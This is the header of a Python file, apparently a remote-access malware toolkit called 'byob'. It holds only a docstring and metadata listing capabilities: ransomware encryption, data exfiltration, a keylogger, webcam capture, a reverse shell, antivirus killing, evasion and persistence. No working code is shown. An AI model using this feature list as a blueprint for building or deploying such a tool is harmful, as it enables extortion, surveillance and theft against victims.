
#!/usr/bin/python
'''
    >  Features
        - Ransom Files			encrypt host files and ransom them to the user for Bitcoin
        - Upload Files			automatically upload valuable data via FTP, Pastebin, or Imgur
        - Outlook Email			upload emails / send dropper links to contacts disguised as Imgur link
        - SMS/Texting			text dropper link to contacts disguised as a shared Imgur link
        - Webcam			live stream from webcam or auto-upload captured images/videos
        - Keylogger			log the keystrokes, clipboard, and name of the active window
        - Screenshot			snap screenshots of the current desktop
        - Reverse TCP Shell		remote access directly through a terminal with all Unix command
        - Escalate Privileges	        bypass UAC to gain administrator privileges (Windows only)
        - Packet Sniffer		capture logs of host network traffic
        - Port Scanner			scan the local network to map online hosts and open ports
    >  Portability
        - Pure Python			simple, powerful language that makes writing your own modules easy
        - Platform-Independent          python comes pre-installed most major platforms & architectures
        - No Python?			no problem! clients are compiled with a standalone Python interpreter
        - Zero Dependencies		missing packages are loaded remotely and then dynamically imported
    >  Encryption
        - End-to-end encryption	        all communication between clients and server is encrypted on both ends
        - AES in OCB mode		Secure data confidentiality, integrity, and authenticity
        - 256 bit keys			Diffie-Hellman Key Exchange (RFC 2631) is safe even on monitored networks
    >  Security
        - Firewall evasion		reverse TCP shells (firewalls generally allow
        - Anti-anti-virus		randomized obfuscation guarantees unique hash for every client binary
        - Anti-forensics		client binaries are encrypted and is decrypted in memory at run-time
        - Counter-measures		continually monitor & kill any task manager and anti-virus processes
    >  Persistence
        - Crontab Job			(Linux)   add a crontab job that runs the client on a regular interval
        - Launch Agent			(Mac OSX) run a Bash script that adds a new Launch Agent to run client on startup
        - Scheduled Task 		(Windows) add a Scheduled Task to execute the client at a regular interval
        - WMI Event 			(Windows) use Powershell to make a WMI event to run client on startup
        - Startup File 			(Windows) create internet shortcut to startup with local path as URL (file:///)
        - Registry Key 			(Windows) modify Windows Registry by adding a 'Run' key to run client on startup
        - File Permissions		modify client permissions to prevent non-owners from reading/removing it
        - File Attributes		modify client attributes to make it hidden/system-file/read-only/etc.
        - Add New User			create a new username + password that is does not appear at login screen
'''


__all__ 	= ['byob']
__author__ 	= 'Daniel Vega-Myhre'
__license__ 	= 'GPLv3'
__version__ = '0.4.7'